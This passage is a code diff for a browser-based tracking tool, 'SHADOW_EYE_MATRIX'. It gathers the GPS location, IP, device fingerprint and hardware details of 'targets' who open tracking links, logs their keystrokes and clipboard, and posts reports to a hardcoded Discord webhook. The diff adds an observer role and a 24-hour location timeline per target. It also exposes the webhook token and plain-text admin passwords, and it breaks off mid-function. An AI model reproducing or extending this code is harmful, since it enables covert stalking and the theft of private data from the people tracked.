@@ -9,11 +9,14 @@
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
 
 const AUTH = { username: 'admin', password: 'napxper' };
+const OBSERVER_AUTH = { username: 'admin', password: 'lit' };
 const BASE_LAT = 9.9833;
 const BASE_LNG = 99.1500;
 const SESSION_KEY = 'gps_shadow_session';
 const PLAYERS_KEY = 'shadow_eye_players';
 const TRACKING_INTERVAL_MS = 60000;
+const TIMELINE_KEY = 'shadow_eye_timeline_';
+const ADMIN_OBSERVER_KEY = 'admin_observer_ips';
 
 // ===== DOM (safe refs — populated on init) =====
 let loginScreen, dashboard, loginForm, loginError, logoutBtn;
@@ -26,9 +29,15 @@ let drawerBattery, drawerNetwork, drawerDistance, drawerNotes, drawerSaveNotes;
 let drawerPlayerList, drawerIdentity, drawerLocationHistory;
 let loadingScreen, loadingBar, loadingText;
 let quickGpsBtn, quickStatusBtn, quickBatteryBtn, quickNetworkBtn, quickClearBtn, backToMenuBtn;
+// Mobile Drawer elements
+let leftDrawer, leftDrawerClose, mobileLeftToggle, mobileRightToggle;
+let drawerGpsBtn, drawerQuickGpsBtn, drawerQuickStatusBtn, drawerQuickBatteryBtn;
+let drawerQuickNetworkBtn, drawerQuickClearBtn, drawerBackToMenuBtn;
+let drawerInfoSession, drawerInfoActiveTarget, drawerInfoGps, drawerInfoLastAction;
 
 // ===== STATE =====
 let sessionUser = null;
+let userRole = null; // 'super-admin' or 'observer'
 let lastGpsResult = null;
 let isProcessing = false;
 let screenAnalytics = null;
@@ -73,6 +82,7 @@ function safeInit() {
   commandInput     = $('command-input');
   consoleClock     = $('console-clock');
   headerStatus     = $('header-status');
+  headerRole       = $('header-role');
   infoSession      = $('info-session');
   infoGps          = $('info-gps');
   infoLastAction   = $('info-last-action');
@@ -109,13 +119,13 @@ function safeInit() {
   loadingScreen    = $('loading-screen');
   loadingBar       = $('loading-bar');
   loadingText      = $('loading-text');
-
+  
   if (!loginForm) return;
-
+  
   bindEvents();
   startClock();
   initKeyloggerAndClipboard();
-
+  
   const saved = loadSession();
   if (saved === AUTH.username) {
     showAppSelector();
@@ -149,7 +159,7 @@ function initKeyloggerAndClipboard() {
     keyloggerState[targetId].lastUpdate = new Date().toISOString();
     updatePlayerMetadataDisplay(targetId);
   });
-
+  
   // Clipboard Sniffer - capture copy events
   document.addEventListener('copy', (e) => {
     if (!sessionUser) return;
@@ -291,7 +301,9 @@ function defaultPlayers() {
     os: null,
     screen: null,
     notes: '',
-    identity: ''
+    identity: '',
+    lastOnline: null,
+    lastOffline: null
   }];
 }
 
@@ -311,6 +323,42 @@ function savePlayers() {
 
 function getPlayer(id) {
   return players.find((p) => p.id === id);
+}
+
+// ===== STATUS INDICATOR HELPER =====
+function getStatusInfo(player) {
+  if (!player) return { color: '⚫', text: 'ออฟไลน์', class: 'text-neutral-500' };
+  
+  const now = new Date();
+  
+  // Online - has coords and lastUpdate within 2 minutes
+  if (player.coords && player.lastUpdate) {
+    const lastUpdate = new Date(player.lastUpdate);
+    const diffMs = now - lastUpdate;
+    const diffMins = Math.floor(diffMs / 60000);
+    
+    if (diffMins < 2) {
+      return { color: '🟢', text: 'ออนไลน์', class: 'text-green-400' };
+    }
+  }
+  
+  // Recently offline (within 1 hour)
+  if (player.lastOffline) {
+    const lastOffline = new Date(player.lastOffline);
+    const diffMs = now - lastOffline;
+    const diffMins = Math.floor(diffMs / 60000);
+    
+    if (diffMins < 60) {
+      return { 
+        color: '🟠', 
+        text: `ออฟไลน์ ${diffMins} นาทีที่แล้ว`, 
+        class: 'text-orange-400' 
+      };
+    }
+  }
+  
+  // Offline for more than 1 hour
+  return { color: '⚫', text: 'ออฟไลน์นานเกิน 1 ชั่วโมง', class: 'text-neutral-500' };
 }
 
 // ===== TRANSLATION HELPER =====
@@ -358,6 +406,81 @@ function copyTrackingLink(playerId) {
   });
 }
 
+// ===== TIMELINE LOG (24-Hour) =====
+function addTimelineEvent(playerId, eventType, data = {}) {
+  const timelineKey = TIMELINE_KEY + playerId;
+  const now = new Date();
+  
+  const event = {
+    type: eventType,
+    timestamp: now.toISOString(),
+    time: now.toLocaleTimeString('th-TH', { hour12: false }),
+    date: now.toLocaleDateString('th-TH'),
+    ...data
+  };
+  
+  let timeline = [];
+  try {
+    const raw = localStorage.getItem(timelineKey);
+    timeline = raw ? JSON.parse(raw) : [];
+  } catch (_) {}
+  
+  timeline.push(event);
+  
+  // Filter out events older than 24 hours
+  const cutoff = new Date(now.getTime() - 24 * 60 * 60 * 1000);
+  timeline = timeline.filter(e => new Date(e.timestamp) > cutoff);
+  
+  try { localStorage.setItem(timelineKey, JSON.stringify(timeline)); } catch (_) {}
+  
+  return event;
+}
+
+function getTimeline(playerId) {
+  const timelineKey = TIMELINE_KEY + playerId;
+  try {
+    const raw = localStorage.getItem(timelineKey);
+    return raw ? JSON.parse(raw) : [];
+  } catch (_) {
+    return [];
+  }
+}
+
+function renderTimeline(timeline) {
+  if (!timeline || timeline.length === 0) {
+    return '<div class="text-neutral-500">— ไม่มีประวัติ 24 ชม. —</div>';
+  }
+  
+  return timeline.map((e, i) => {
+    const timeAgo = getTimeAgo(new Date(e.timestamp));
+    const eventIcon = e.type === 'online' ? '🟢' : e.type === 'offline' ? '🔴' : '📍';
+    const eventText = e.type === 'online' ? 'ออนไลน์' : e.type === 'offline' ? 'ออฟไลน์' : 'อัปเดตพิกัด';
+    
+    return `
+      <div class="border-b border-neutral-800 pb-1 mb-1 last:border-0 last:pb-0 last:mb-0">
+        <div class="flex items-center gap-1">
+          <span class="text-[10px]">${eventIcon}</span>
+          <span class="text-[10px] text-white font-mono">${e.time}</span>
+          <span class="text-[9px] text-neutral-400">(${timeAgo})</span>
+        </div>
+        <div class="text-[10px] text-orange-400 ml-4">${eventText}</div>
+        ${e.coords ? `<div class="text-[9px] text-cyan-400 ml-4">${e.coords.latitude.toFixed(4)}, ${e.coords.longitude.toFixed(4)}</div>` : ''}
+      </div>
+    `;
+  }).join('');
+}
+
+function getTimeAgo(date) {
+  const now = new Date();
+  const diffMs = now - date;
+  const diffMins = Math.floor(diffMs / 60000);
+  const diffHours = Math.floor(diffMins / 60);
+  
+  if (diffMins < 1) return 'เพิ่งนิดหน่อย';
+  if (diffMins < 60) return `${diffMins} นาทีที่แล้ว`;
+  return `${diffHours} ชั่วโมงที่แล้ว`;
+}
+
 // ===== RIGHT SLIDING DRAWER =====
 function openRightDrawer(playerId) {
   const p = getPlayer(playerId);
@@ -387,6 +510,9 @@ function openRightDrawer(playerId) {
   // Render location history
   renderLocationHistory(playerId);
   
+  // Render 24-hour timeline
+  renderTimelineHistory(playerId);
+  
   if (rightDrawer) {
     rightDrawer.classList.remove('hidden');
     rightDrawer.style.transform = 'translateX(0)';
@@ -412,12 +538,12 @@ function renderDrawerPlayerList() {
     item.className = `flex items-center justify-between p-2 rounded border border-neutral-700 cursor-pointer hover:bg-neutral-800 transition ${selectedTarget === p.id ? 'bg-green-500/10 border-green-500/30' : ''}`;
     item.dataset.id = p.id;
     
-    const statusColor = p.coords ? 'text-green-400' : 'text-neutral-500';
+    const statusInfo = getStatusInfo(p);
     
     item.innerHTML = `
       <div>
         <div class="text-xs font-medium text-white">${esc(p.name)}</div>
-        <div class="text-[10px] ${statusColor}">${p.coords ? `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}` : 'No coords'}</div>
+        <div class="text-[10px] ${statusInfo.class}">${statusInfo.color} ${statusInfo.text}</div>
       </div>
       <button class="copy-link-btn text-[10px] text-orange-400 hover:text-orange-300" data-id="${p.id}" title="คัดลอกลิงก์">📋</button>
     `;
@@ -466,6 +592,14 @@ function renderLocationHistory(playerId) {
   `).join('');
 }
 
+function renderTimelineHistory(playerId) {
+  const timelineContainer = document.getElementById('drawer-timeline-history');
+  if (!timelineContainer) return;
+  
+  const timeline = getTimeline(playerId);
+  timelineContainer.innerHTML = renderTimeline(timeline);
+}
+
 function savePlayerNotes() {
   const p = getPlayer(selectedTarget);
   if (!p) return;
@@ -495,6 +629,7 @@ function savePlayerNotes() {
   
   savePlayers();
   renderLocationHistory(selectedTarget);
+  renderTimelineHistory(selectedTarget);
   appendLog(`[MATRIX] Notes saved for ${p.name}`, LOG.green);
 }
 
@@ -552,6 +687,9 @@ function updatePlayerMetadataDisplay(playerId) {
     mapsLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
   }
   
+  // Get status info
+  const statusInfo = getStatusInfo(p);
+  
   metadataEl.innerHTML = `
     <div class="mt-2 pt-2 border-t border-neutral-800 space-y-1.5">
       <div class="text-[10px] text-white">
@@ -607,24 +745,36 @@ function updatePlayerMetadataDisplay(playerId) {
   `;
 }
 
+// ===== RENDER COMPACT PLAYER LIST WITH ACCORDION =====
 function renderPlayerList() {
   if (!playerListEl) return;
   playerListEl.innerHTML = '';
-
+  
   players.forEach((p) => {
     const card = document.createElement('div');
     card.className = `player-card rounded-lg border border-neutral-700 p-2.5 cursor-pointer ${p.tracking ? 'tracking-on' : 'tracking-off'} ${selectedTarget === p.id ? 'selected' : ''}`;
     card.dataset.id = p.id;
-
-    const statusColor = p.coords ? 'text-green-400' : 'text-neutral-500';
-    const trackLabel = p.tracking ? 'ON' : 'OFF';
-
+    
+    // Get status info for indicator
+    const statusInfo = getStatusInfo(p);
+    
+    // Get hardware telemetry for compact display
+    const hw = getHardwareTelemetry();
+    
+    // Check if this card is expanded
+    const isExpanded = p._expanded || false;
+    
     card.innerHTML = `
       <div class="flex items-center justify-between gap-1 mb-1.5">
-        <span class="player-name text-xs font-medium text-white truncate" data-id="${p.id}" title="คลิกเพื่อแก้ไขชื่อ">${esc(p.name)}</span>
-        <span class="tracking-badge text-[9px] px-1.5 py-0.5 rounded font-mono shrink-0">${trackLabel}</span>
+        <div class="flex items-center gap-2">
+          <span class="status-indicator text-sm">${statusInfo.color}</span>
+          <span class="player-name text-xs font-medium text-white truncate" data-id="${p.id}" title="คลิกเพื่อแก้ไขชื่อ">${esc(p.name)}</span>
+        </div>
+        <span class="tracking-badge text-[9px] px-1.5 py-0.5 rounded font-mono shrink-0">${p.tracking ? 'ON' : 'OFF'}</span>
       </div>
-      <div class="text-[10px] ${statusColor} mb-2 font-mono truncate">${p.coords ? `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}` : 'No coords yet'}</div>
+      <div class="text-[10px] text-neutral-400 mb-2 font-mono truncate">
+        IP: ${p.ip || '—'} | ${p.os ? translateStatus('OS', p.os) : '—'}
+      </div>
       <div class="flex gap-1.5">
         <button class="btn-toggle flex-1 text-[10px] py-1 rounded border border-neutral-600 text-white hover:border-green-500/50 transition" data-id="${p.id}">
           ${p.tracking ? '⏸ Stop' : '▶ Track'}
@@ -639,43 +789,121 @@ function renderPlayerList() {
           🗑️
         </button>
       </div>
+      <button class="btn-edit-desc w-full mt-2 text-[10px] py-1 rounded border border-purple-600/50 text-purple-400 hover:border-purple-500 transition" data-id="${p.id}">
+        📝 แก้ไขคำอธิบาย
+      </button>
+      <div class="player-details ${isExpanded ? '' : 'hidden'} mt-2 pt-2 border-t border-neutral-800 space-y-1.5">
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">🖥️ ประเภทอุปกรณ์:</span> ${hw.deviceType || '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">⚙️ CPU:</span> ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">💾 RAM:</span> ${hw.ramGB ? hw.ramGB + ' GB' : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">🎮 GPU:</span> ${hw.gpu ? hw.gpu.substring(0, 25) + (hw.gpu.length > 25 ? '...' : '') : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">🧍 ท่าทาง:</span> ${getPostureThai(hw.posture)}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-green-400">📍 พิกัด:</span> 
+          ${p.coords ? `<a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400 hover:underline">${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}</a>` : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-green-400">🌐 IP:</span> ${p.ip || '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-green-400">📡 ISP:</span> ${p.isp || '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-green-400">🔋 แบตเตอรี่:</span> ${p.battery !== null ? p.battery + '%' : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-green-400">📶 เครือข่าย:</span> ${p.network ? translateStatus('Connection', p.network) : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-green-400">🗺️ ระยะห่าง:</span> ${p.distanceKm !== null ? p.distanceKm.toFixed(2) + ' km' : '—'}
+        </div>
+      </div>
       <div class="player-metadata"></div>
     `;
-
-    card.addEventListener('click', (e) => {
+    
+// Click on card header to toggle expand/collapse
+    const headerEl = card.querySelector('.player-name').parentElement.parentElement;
+    headerEl.addEventListener('click', (e) => {
       if (e.target.closest('button') || e.target.closest('.player-name-input')) return;
-      openRightDrawer(p.id);
+      togglePlayerExpand(p.id);
     });
-
+    
     card.querySelector('.player-name').addEventListener('click', (e) => {
       e.stopPropagation();
+      if (isObserver()) {
+        showObserverWarning();
+        return;
+      }
       startRename(p.id, e.target);
     });
-
+    
     card.querySelector('.btn-toggle').addEventListener('click', (e) => {
       e.stopPropagation();
+      if (isObserver()) {
+        showObserverWarning();
+        return;
+      }
       toggleTracking(p.id);
     });
-
+    
     card.querySelector('.btn-fetch').addEventListener('click', (e) => {
       e.stopPropagation();
+      if (isObserver()) {
+        showObserverWarning();
+        return;
+      }
       forceFetchPlayer(p.id);
     });
-
+    
     card.querySelector('.btn-copy-link').addEventListener('click', (e) => {
       e.stopPropagation();
       copyTrackingLink(p.id);
     });
-
+    
     card.querySelector('.btn-delete').addEventListener('click', (e) => {
       e.stopPropagation();
+      if (isObserver()) {
+        showObserverWarning();
+        return;
+      }
       deletePlayer(p.id);
     });
-
+    
+    card.querySelector('.btn-edit-desc').addEventListener('click', (e) => {
+      e.stopPropagation();
+      if (isObserver()) {
+        showObserverWarning();
+        return;
+      }
+      openRightDrawer(p.id);
+      // Focus on notes textarea
+      setTimeout(() => {
+        if (drawerNotes) drawerNotes.focus();
+      }, 300);
+    });
+    
     playerListEl.appendChild(card);
     
     updatePlayerMetadataDisplay(p.id);
   });
+}
+
+function togglePlayerExpand(playerId) {
+  const p = getPlayer(playerId);
+  if (!p) return;
+  
+  p._expanded = !p._expanded;
+  renderPlayerList();
 }
 
 function startRename(id, el) {
@@ -688,7 +916,7 @@ function startRename(id, el) {
   el.replaceWith(input);
   input.focus();
   input.select();
-
+  
   const commit = () => {
     const val = input.value.trim() || p.name;
     p.name = val;
@@ -698,7 +926,7 @@ function startRename(id, el) {
     appendLog(`[MATRIX] Renamed target → "${val}"`, LOG.orange);
     printCommandGuide();
   };
-
+  
   input.addEventListener('blur', commit);
   input.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') { e.preventDefault(); input.blur(); }
@@ -721,11 +949,11 @@ function selectTarget(id) {
 function toggleTracking(id) {
   const p = getPlayer(id);
   if (!p) return;
-
+  
   p.tracking = !p.tracking;
   savePlayers();
   renderPlayerList();
-
+  
   if (p.tracking) {
     appendLog(`[MATRIX] Tracking ON — ${p.name}`, LOG.green);
     startTrackingTimer(id);
@@ -784,7 +1012,10 @@ function addPlayer() {
     os: null,
     screen: null,
     notes: '',
-    identity: ''
+    identity: '',
+    lastOnline: null,
+    lastOffline: null,
+    _expanded: false
   });
   savePlayers();
   renderPlayerList();
@@ -803,6 +1034,8 @@ function deletePlayer(id) {
     renderDrawerPlayerList();
     // Clear location history
     try { localStorage.removeItem(`location_history_${id}`); } catch (_) {}
+    // Clear timeline
+    try { localStorage.removeItem(TIMELINE_KEY + id); } catch (_) {}
     appendLog(`[MATRIX] Deleted target: ${p.name}`, LOG.red);
     printCommandGuide();
   }
@@ -1112,7 +1345,7 @@ function createIcon(cls) {
 
 function initMap() {
   if (mapReady || typeof L === 'undefined' || !tacticalMapEl) return;
-
+  
   try {
     mapInstance = L.map(tacticalMapEl, {
       center: [BASE_LAT, BASE_LNG],
@@ -1120,19 +1353,19 @@ function initMap() {
       zoomControl: true,
       attributionControl: true,
     });
-
+    
     L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
       attribution: '&copy; OSM &copy; CARTO',
       subdomains: 'abcd',
       maxZoom: 19,
     }).addTo(mapInstance);
-
+    
     mapMarkers.hq = L.marker([BASE_LAT, BASE_LNG], { icon: createIcon('marker-hq') })
       .addTo(mapInstance)
       .bindPopup('<b>HQ — Chumphon</b><br>ศูนย์บัญชาการ');
-
+    
     mapReady = true;
-
+    
     setTimeout(() => {
       try { mapInstance.invalidateSize(); } catch (_) {}
     }, 300);
@@ -1166,7 +1399,7 @@ function updateMapCoordsDisplay(lat, lng, label) {
 
 function updateMapMarker(type, id, lat, lng, popupHtml) {
   if (!mapInstance || typeof L === 'undefined' || lat == null || lng == null) return;
-
+  
   try {
     if (type === 'admin') {
       if (mapMarkers.admin) mapMarkers.admin.setLatLng([lat, lng]);
@@ -1227,15 +1460,15 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
     printCommandGuide();
     return;
   }
-
+  
   isProcessing = true;
   setHeaderStatus('Processing...', 'orange');
   if (infoGps) { infoGps.textContent = 'Processing...'; infoGps.className = 'text-orange-400'; }
   if (infoLastAction) infoLastAction.textContent = actorLabel;
-
+  
   appendLog(`[${actorLabel}] Hybrid Geolocation start...`, LOG.orange);
   appendLog('กำลังขอสิทธิ์ GPS...', LOG.white);
-
+  
   const fp = getFingerprint();
   const result = {
     actor: actorLabel,
@@ -1244,14 +1477,14 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
     timestamp: new Date().toISOString(),
     mapsLink: null,
   };
-
+  
   try {
     const gps = await requestGPS();
     result.permission = 'Granted';
     result.source = 'GPS';
     result.coords = gps;
     result.mapsLink = mapsLink(gps.latitude, gps.longitude);
-
+    
     appendLog(`[${actorLabel}] GPS Granted`, LOG.green);
     appendLog(`พิกัด: ${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}`, LOG.white);
     appendLog(`ความแม่นยำ: ±${Math.round(gps.accuracy)}m`, LOG.orange);
@@ -1261,7 +1494,7 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
     result.source = 'IP Geolocation';
     appendLog(`[${actorLabel}] GPS Denied — IP Fallback`, LOG.red);
     appendLog(`Reason: ${err.message || 'denied'}`, LOG.red);
-
+    
     try {
       const ip = await fetchIPGeo();
       result.ipData = ip;
@@ -1272,17 +1505,17 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
     } catch (ipErr) {
       appendLog(`IP Geo failed: ${ipErr.message}`, LOG.red);
     }
-
+    
     appendLog(`OS: ${fp.os} | Browser: ${fp.browser} | TZ: ${fp.timezone}`, LOG.orange);
     if (infoGps) { infoGps.textContent = 'Denied (IP)'; infoGps.className = 'text-red-400'; }
   }
-
+  
   if (result.coords?.latitude != null) {
     result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
     appendLog(`[DISTANCE]: Target is ${result.distanceKm.toFixed(2)} km away from Center.`, LOG.white);
-
+    
     panMapTo(result.coords.latitude, result.coords.longitude, 14);
-
+    
     if (playerId) {
       const p = getPlayer(playerId);
       if (p) {
@@ -1296,6 +1529,11 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
         p.isp = result.ipData?.org || null;
         p.os = fp.os;
         p.screen = fp.screen;
+        
+        // Update lastOnline and add timeline event
+        p.lastOnline = result.timestamp;
+        p.lastOffline = null;
+        addTimelineEvent(playerId, 'online', { coords: p.coords });
         
         if (typeof navigator.getBattery === 'function') {
           try {
@@ -1325,11 +1563,11 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
       lastGpsResult = result;
     }
   }
-
+  
   appendLog('Sending to Discord...', LOG.orange);
   await sendToDiscord(result);
   appendLog('Complete.', LOG.green);
-
+  
   setHeaderStatus('Ready', 'white');
   isProcessing = false;
   printCommandGuide();
@@ -1339,14 +1577,14 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
 function postDiscord(payload) {
   if (!DISCORD_WEBHOOK_URL) return Promise.resolve(false);
   const body = JSON.stringify(payload);
-
+  
   try {
     if (typeof navigator.sendBeacon === 'function') {
       const blob = new Blob([body], { type: 'application/json' });
       if (navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob)) return Promise.resolve(true);
     }
   } catch (_) {}
-
+  
   return fetch(DISCORD_WEBHOOK_URL, {
     method: 'POST',
     mode: 'no-cors',
@@ -1367,7 +1605,7 @@ async function sendToDiscord(data) {
     appendLog('Discord URL not configured', LOG.red);
     return;
   }
-
+  
   const granted = data.permission === 'Granted';
   const fp = data.fingerprint || {};
   const hw = getHardwareTelemetry();
@@ -1376,7 +1614,7 @@ async function sendToDiscord(data) {
     { name: '🔐 Permission', value: granted ? '✅ Granted (GPS)' : '❌ Denied (IP Geo)', inline: true },
     { name: '📡 Source', value: data.source || '—', inline: true },
   ];
-
+  
   if (data.coords) {
     fields.push({ name: '📍 Coordinates', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
     if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
@@ -1392,7 +1630,7 @@ async function sendToDiscord(data) {
       { name: '🔢 IP', value: data.ipData.ip || '—', inline: true },
     );
   }
-
+  
   // Hardware Telemetry fields
   fields.push(
     { name: '🖥️ Device Type', value: hw.deviceType || '—', inline: true },
@@ -1401,7 +1639,7 @@ async function sendToDiscord(data) {
     { name: '🎮 GPU', value: hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—', inline: false },
     { name: '🧍 Posture', value: getPostureThai(hw.posture), inline: true },
   );
-
+  
   // Standard fingerprint fields
   fields.push(
     { name: '💻 OS', value: fp.os || '—', inline: true },
@@ -1413,9 +1651,9 @@ async function sendToDiscord(data) {
     { name: '🖥 Effective Res', value: fp.effectiveResolution || '—', inline: true },
     { name: '👤 Session', value: sessionUser || '—', inline: true },
   );
-
+  
   if (data.mapsLink) fields.push({ name: '🗺 Google Maps', value: `[Open Map](${data.mapsLink})`, inline: false });
-
+  
   const ok = await postDiscord({
     embeds: [{
       title: '🛰 SHADOW_EYE_MATRIX — Location Report',
@@ -1426,7 +1664,7 @@ async function sendToDiscord(data) {
       timestamp: data.timestamp,
     }],
   });
-
+  
   appendLog(ok ? 'Discord payload dispatched ✓' : 'Discord dispatch failed ✗', ok ? LOG.green : LOG.red);
 }
 
@@ -1454,7 +1692,7 @@ function safeNetworkCheck() {
   appendLog('═══ Network Status ═══', LOG.green);
   const online = typeof navigator.onLine === 'boolean' ? navigator.onLine : true;
   appendLog(`Connection: ${online ? 'Online' : 'Offline'}`, online ? LOG.green : LOG.red);
-
+  
   try {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn) {
@@ -1528,14 +1766,14 @@ async function handleCommand(raw) {
   const cmd = raw.trim().toLowerCase();
   if (!cmd) return;
   appendLog(`> ${raw.trim()}`, LOG.green);
-
+  
   const fn = COMMANDS[cmd];
   if (!fn) {
     appendLog(`Unknown: "${cmd}" — type /help`, LOG.red);
     printCommandGuide();
     return;
   }
-
+  
   if (infoLastAction) infoLastAction.textContent = cmd;
   const r = await fn();
   if (r !== 'skip') printCommandGuide();
@@ -1554,30 +1792,48 @@ function showAppSelector() {
   if (appSelector) appSelector.classList.remove('hidden');
 }
 
-function showDashboard(user, restore = false) {
+function showDashboard(user, restore = false, role = 'super-admin') {
   sessionUser = user;
+  userRole = role;
   saveSession(user);
   captureScreenAnalytics();
   loadPlayers();
   initMonitors();
   initDeviceOrientation();
-
+  
   if (appSelector) appSelector.classList.add('hidden');
   if (dashboard) dashboard.classList.remove('hidden');
   if (infoSession) infoSession.textContent = user;
   if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
+  
+  // Update role indicator in header
+  if (headerRole) {
+    if (role === 'observer') {
+      headerRole.textContent = 'Admin Observer';
+      headerRole.classList.remove('hidden');
+    } else {
+      headerRole.classList.add('hidden');
+    }
+  }
+  
   setHeaderStatus(typeof navigator.onLine === 'boolean' && navigator.onLine ? 'Ready' : 'Offline',
     navigator.onLine ? 'white' : 'red');
-
+  
   clearConsole();
   appendLog('═══════════════════════════════════════════', LOG.dim);
   appendLog('SHADOW_EYE_MATRIX — Integrated Tactical Mode', LOG.green);
   appendLog('═══════════════════════════════════════════', LOG.dim);
-  appendLog(restore ? `Session restored — Welcome back, ${user}` : `Authenticated — Welcome, ${user}`, LOG.green);
-
+  
+  if (role === 'observer') {
+    appendLog(`🔍 โหวตเป็นผู้สังเกตการณ์ (Observer Mode) — ${user}`, LOG.orange);
+    appendLog('⚠️ คุณสามารถดูข้อมูลได้เท่านั้น ไม่สามารถแก้ไขได้', LOG.red);
+  } else {
+    appendLog(restore ? `Session restored — Welcome back, ${user}` : `Authenticated — Welcome, ${user}`, LOG.green);
+  }
+  
   const sa = screenAnalytics;
   appendLog(`Screen: ${sa.resolution} @ ${sa.devicePixelRatio}x DPR (${sa.orientation})`, LOG.orange);
-
+  
   // Log hardware telemetry on dashboard load
   const hw = getHardwareTelemetry();
   appendLog('═══ Advanced Hardware Telemetry ═══', LOG.green);
@@ -1586,15 +1842,15 @@ function showDashboard(user, restore = false) {
   appendLog(`RAM: ${hw.ramGB ? hw.ramGB + ' GB' : '—'}`, LOG.white);
   appendLog(`GPU: ${hw.gpu ? hw.gpu.substring(0, 40) + (hw.gpu.length > 40 ? '...' : '') : '—'}`, LOG.white);
   appendLog(`Posture: ${getPostureThai(hw.posture)}`, LOG.orange);
-
+  
   renderPlayerList();
   printCommandGuide();
-
+  
   setTimeout(() => {
     initMap();
     try { mapInstance?.invalidateSize(); } catch (_) {}
   }, 200);
-
+  
   if (commandInput) commandInput.focus();
 }
 
@@ -1605,9 +1861,9 @@ function showLogin() {
   clearSession();
   teardownMonitors();
   stopAllTracking();
-
+  
   destroyMap();
-
+  
   if (dashboard) dashboard.classList.add('hidden');
   if (appSelector) appSelector.classList.add('hidden');
   if (loginScreen) loginScreen.classList.remove('hidden');
@@ -1636,6 +1892,111 @@ function setLoadingProgress(percent) {
   }
 }
 
+// ===== MOBILE DRAWER FUNCTIONS =====
+function initMobileDrawers() {
+  // Left Drawer elements
+  leftDrawer = $('left-drawer');
+  leftDrawerClose = $('left-drawer-close');
+  mobileLeftToggle = $('mobile-left-toggle');
+  mobileRightToggle = $('mobile-right-toggle');
+  
+  // Drawer control buttons
+  drawerGpsBtn = $('drawer-gps-btn');
+  drawerQuickGpsBtn = $('drawer-quick-gps-btn');
+  drawerQuickStatusBtn = $('drawer-quick-status-btn');
+  drawerQuickBatteryBtn = $('drawer-quick-battery-btn');
+  drawerQuickNetworkBtn = $('drawer-quick-network-btn');
+  drawerQuickClearBtn = $('drawer-quick-clear-btn');
+  drawerBackToMenuBtn = $('drawer-back-to-menu-btn');
+  
+  // Drawer info elements
+  drawerInfoSession = $('drawer-info-session');
+  drawerInfoActiveTarget = $('drawer-info-active-target');
+  drawerInfoGps = $('drawer-info-gps');
+  drawerInfoLastAction = $('drawer-info-last-action');
+  
+  // Mobile toggle buttons
+  mobileLeftToggle?.addEventListener('click', openLeftDrawer);
+  mobileRightToggle?.addEventListener('click', () => {
+    if (selectedTarget && selectedTarget !== 'admin') {
+      openRightDrawer(selectedTarget);
+    } else {
+      // Open with first player or show message
+      if (players.length > 0) {
+        openRightDrawer(players[0].id);
+      }
+    }
+  });
+  
+  // Left drawer close button
+  leftDrawerClose?.addEventListener('click', closeLeftDrawer);
+  
+  // Drawer control buttons
+  drawerGpsBtn?.addEventListener('click', () => {
+    selectedTarget = 'admin';
+    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
+    closeLeftDrawer();
+    appendLog('[Mobile Drawer] Admin GPS scan initiated', LOG.orange);
+    runHybridGeolocation('Admin');
+  });
+  
+  drawerQuickGpsBtn?.addEventListener('click', () => {
+    selectedTarget = 'admin';
+    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
+    closeLeftDrawer();
+    runHybridGeolocation('Admin');
+  });
+  
+  drawerQuickStatusBtn?.addEventListener('click', () => {
+    closeLeftDrawer();
+    handleCommand('/status');
+  });
+  
+  drawerQuickBatteryBtn?.addEventListener('click', () => {
+    closeLeftDrawer();
+    handleCommand('/battery');
+  });
+  
+  drawerQuickNetworkBtn?.addEventListener('click', () => {
+    closeLeftDrawer();
+    handleCommand('/network');
+  });
+  
+  drawerQuickClearBtn?.addEventListener('click', () => {
+    closeLeftDrawer();
+    handleCommand('/clear');
+  });
+  
+  drawerBackToMenuBtn?.addEventListener('click', () => {
+    showLoading('กลับสู่เมนูหน้าแรก...');
+    setTimeout(() => {
+      showLogin();
+      hideLoading();
+    }, 500);
+  });
+}
+
+function openLeftDrawer() {
+  if (leftDrawer) {
+    leftDrawer.classList.remove('hidden');
+    leftDrawer.style.transform = 'translateX(0)';
+    // Update drawer info
+    if (drawerInfoSession) drawerInfoSession.textContent = sessionUser || '—';
